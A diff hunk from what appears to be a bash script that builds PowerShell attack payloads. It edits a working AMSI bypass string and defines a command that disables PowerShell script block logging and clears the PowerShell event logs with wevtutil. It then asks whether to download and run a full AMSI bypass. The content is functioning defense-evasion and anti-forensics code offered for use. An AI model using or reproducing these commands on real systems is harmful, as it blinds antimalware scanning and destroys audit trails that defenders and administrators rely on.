@@ -622,7 +622,7 @@ then
     win="-W Hidden"
     at="@"
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
-    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$null,\$true);"
+    AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$$placeh,\$true);"
     disableLog="[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField(\"signatures\",\"NonPublic,static\").SetValue(\$null, (New-Object 'System.Collections.Generic.HashSet[string]'));\$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue(\$null);\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'] = @{};\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'].Add('EnableScriptBlockLogging\', 0);Start-Job {set-alias $wevutil wevtutil;sleep -Milliseconds 1005; $wevutil cl Microsoft-Windows-PowerShell/Operational;$wevutil cl \"Windows PowerShell\"};"
     echo -en "\nDo you wish to automatically download and run full AMSI bypass?"
         greenprint "[Y/n]"
